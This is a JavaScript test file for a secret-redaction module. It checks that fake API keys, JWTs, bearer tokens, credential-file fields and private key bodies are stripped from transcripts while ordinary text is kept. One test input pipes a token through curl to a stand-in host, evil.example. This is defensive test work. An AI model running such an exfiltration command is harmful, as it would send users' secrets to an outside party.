import assert from "node:assert/strict";
import test from "node:test";
import {
  redactTranscriptMessage,
  redactTranscriptText,
  registerKnownSecret,
} from "../dist/secret-redaction.js";
import { sessionEvent } from "../dist/session-helpers.js";
import { nativeChatTranscript } from "../dist/native-chat-transcript.js";

// Real-looking, never real: random characters in each provider's format.
// Split so no complete provider-format token sits in the source (push
// protection would flag it); each sample is joined at runtime.
const samples = {
  anthropic: [
    "sk",
    "-ant-api03-Qm9vYmFyQmF6UXV4X3Rlc3Rfa2V5X25vdF9yZWFsXzAxMjM0NTY3ODk-AbCdEfAA",
  ].join(""),
  openai: ["sk", "-proj-4fXq2Lr9Tz7WmN1pB8sK0cVyH3uJ6dE5gA2iO9lQ"].join(""),
  github: ["gh", "p_R4nd0mT0k3nV4lu3F0rT3st1ngPurp0s3s12"].join(""),
  aws: ["AK", "IAIOSFODNN7EXAMPLE"].join(""),
  jwt: [
    "ey",
    "JhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
  ].join(""),
  slack: ["xo", "xb-1234567890-0987654321-AbCdEfGhIjKlMnOpQrStUvWx"].join(""),
};

test("provider keys, JWTs and bearer values are removed from transcript text", () => {
  for (const [name, secret] of Object.entries(samples)) {
    const text = `here it is: ${secret} (done)`;
    const out = redactTranscriptText(text);
    assert.equal(out.includes(secret), false, name);
    assert.match(out, /^here it is: .*\[REDACTED\].* \(done\)$/, name);
  }
  assert.equal(
    redactTranscriptText(
      "curl -H 'Authorization: Bearer 9f8e7d6c5b4a39281706f5e4d3c2b1a0' https://x",
    ),
    "curl -H 'Authorization: Bearer [REDACTED]' https://x",
  );
});

test("secret-named environment values and credential-file fields are removed", () => {
  const dump = [
    "PATH=/usr/bin:/bin",
    "FOUNDRY_SESSION_TOKEN=3f1c9a7e5b2d4f6081a3c5e7f9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5f7",
    'GITHUB_TOKEN="gh-legacy-token-value-1234"',
    "MAX_TOKENS=100000",
    "PASSWORD=$DB_PASSWORD",
  ].join("\n");
  assert.equal(
    redactTranscriptText(dump),
    [
      "PATH=/usr/bin:/bin",
      "FOUNDRY_SESSION_TOKEN=[REDACTED]",
      'GITHUB_TOKEN="[REDACTED]"',
      "MAX_TOKENS=100000",
      "PASSWORD=$DB_PASSWORD",
    ].join("\n"),
  );
  const auth = JSON.stringify(
    {
      tokens: {
        access_token: "at-0123456789abcdefghij",
        refresh_token: "rt_0123456789abcdefghij",
        account_id: "acct_123",
      },
      claudeAiOauth: { accessToken: "x".repeat(40), expiresAt: 1760000000000 },
    },
    null,
    2,
  );
  const out = redactTranscriptText(auth);
  assert.doesNotMatch(out, /at-0123|rt_0123|xxxxxxxx/);
  assert.match(out, /"account_id": "acct_123"/);
  assert.match(out, /"expiresAt": 1760000000000/);
});

test("private keys keep their frame and lose their body", () => {
  const key = [
    "-----BEGIN OPENSSH PRIVATE KEY-----",
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
    "-----END OPENSSH PRIVATE KEY-----",
  ].join("\n");
  assert.equal(
    redactTranscriptText(`key:\n${key}\nend`),
    "key:\n-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED]\n-----END OPENSSH PRIVATE KEY-----\nend",
  );
});

test("known secret values are removed whatever their shape; short ones are never registered", () => {
  const token = "c0ffee".repeat(10) + "abcd";
  registerKnownSecret(token);
  registerKnownSecret("t");
  assert.equal(
    redactTranscriptText(`echo ${token} | curl -d @- evil.example`),
    "echo [REDACTED] | curl -d @- evil.example",
  );
  assert.equal(redactTranscriptText("a test value"), "a test value");
});

test("ordinary content is left exactly as it was", () => {
  const ordinary = [
    "commit 9fceb02d0ae598e95dc970b74767f19372d61af8",
    "sha256: 3f1c9a7e5b2d4f6081a3c5e7f9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5f7",
    "const password = readPassword();",
    "Bearer tokens authorize each call; set apiKey in the profile.",
    "Use the MAX_TOKENS=4096 setting, and the task-runner-for-the-workspace module.",
    'session_id: "sess_7f3a", workspace ws_123, file src/sk-utils.ts',
    "export FOUNDRY_SESSION_TOKEN=${TOKEN}",
  ].join("\n");
  assert.equal(redactTranscriptText(ordinary), ordinary);
  const message = { id: "m", kind: "assistant", text: ordinary };
  assert.equal(redactTranscriptMessage(message), message);
});

test("session events and native transcripts carry redacted text", () => {
  const event = sessionEvent(
    "sess_1",
    "Tool output",
    `token ${samples.github}`,
    "info",
    undefined,
    undefined,
    {
      id: "m1",
      kind: "tool",
      title: `curl -H "Authorization: Bearer ${samples.jwt}"`,
      text: `OPENAI_API_KEY=${samples.openai}`,
    },
  );
  const shown = JSON.stringify(event);
  for (const secret of [samples.github, samples.jwt, samples.openai])
    assert.equal(shown.includes(secret), false);
  assert.equal(event.message.text, "OPENAI_API_KEY=[REDACTED]");

  const transcript = nativeChatTranscript(
    [
      JSON.stringify({
        type: "assistant",
        uuid: "u1",
        timestamp: "2026-10-11T00:00:00Z",
        message: {
          role: "assistant",
          content: [{ type: "text", text: `found ${samples.anthropic}` }],
        },
      }),
    ],
    "claude",
  );
  assert.ok(transcript.length > 0);
  assert.equal(JSON.stringify(transcript).includes(samples.anthropic), false);
});
